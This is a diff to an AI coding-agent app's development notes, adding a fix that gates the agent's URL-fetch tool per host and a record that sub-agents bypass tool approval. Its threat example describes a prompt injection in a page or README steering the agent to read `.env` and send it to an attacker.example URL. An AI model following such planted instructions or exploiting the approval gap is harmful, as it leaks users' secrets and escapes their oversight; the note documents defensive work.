@@ -1370,6 +1370,27 @@ Tests: `WorkspaceBootstrapTests`, `SessionCommitTests`, and range cases in `Vibe
   or diff. Both run detached now, and a slow diff for a file clicked earlier does not overwrite
   the one selected since.
 
+## fetch_url asks per site; chat history saved off the main thread (2026-09-19)
+
+- **`fetch_url` was the one unguarded way out.** File reads need no approval and the default
+  shell blocks `curl`, so an instruction planted in a page or README could have the agent read
+  `.env` and fetch `https://attacker.example/?d=<contents>`. `WebFetchPolicy` now decides:
+  a public host asks the first time in a chat, and approving it allows that host for the rest of
+  the chat (`WebFetchAllowlist`, in memory, per session id); loopback, private, link-local, CGNAT,
+  `.local`/`.lan` names and odd numeric spellings (`2130706433`, `0x7f.1`) ask every time,
+  except this app's own preview servers on loopback. `fetch_url` uses an ephemeral session whose
+  delegate refuses a redirect from a public page into the local network — always, whatever the
+  setting. **Settings → Advanced → Ask Before Fetching New Sites** (default on) turns the
+  questions off for automations that must fetch unattended.
+  Sub-agents are unattended: a fetch that would ask is refused and reported, and sites approved in
+  the parent chat (carried on `AgentRunContext.Frame.sessionId`) still work.
+- **Chat history is no longer rewritten for every streamed chunk.** `onMessageUpdated` fires per
+  chunk and called `saveSessions`, which pretty-printed every session and atomically rewrote
+  `sessions.json` on the main thread — tens of times a second, growing with history. While a
+  reply streams it now saves at most once a second, plus the finished message; and every
+  `saveSessions` goes through `SessionWriter`, one background queue where a newer snapshot
+  replaces an older one still waiting. `loadSessions` and `applicationWillTerminate` flush first.
+
 ## What is left
 
 ### Settings still dead
@@ -1387,6 +1408,16 @@ macOS is the only authority on whether a login item is registered.
   un-publish the key; only revoking it at Firecrawl does.
 
 ### Worth building next
+
+- **Sub-agents do not go through tool approval (found 2026-09-19, not fixed).** Only
+  `AgentRunner` calls `ToolApprovalManager.requestApproval`; `SubAgentExecutor` runs its tools
+  through `ToolExecutionEngine.execute` directly, so `file_delete`, `run_app`, `git_commit`, and
+  shell commands under "Always Ask" run without asking. Its prompt says approvals will be refused
+  and `refusedActions` exists to report them, but nothing enforces it, so that list is always
+  empty. Only `fetch_url` is gated so far. Enforcing all of `approvalReason` would also refuse
+  file edits, which sub-agents exist to make; the likely rule is to allow edits inside the
+  sub-agent's own worktree and refuse the rest. That is a product decision, so it was left for
+  the owner.
 
 - Nothing listed. (`SwiftOpenWork.podspec` was deleted on 2026-09-19: it named a tag that never
   existed, depended on pods that do not exist and targeted iOS. This is an app, not a pod.)
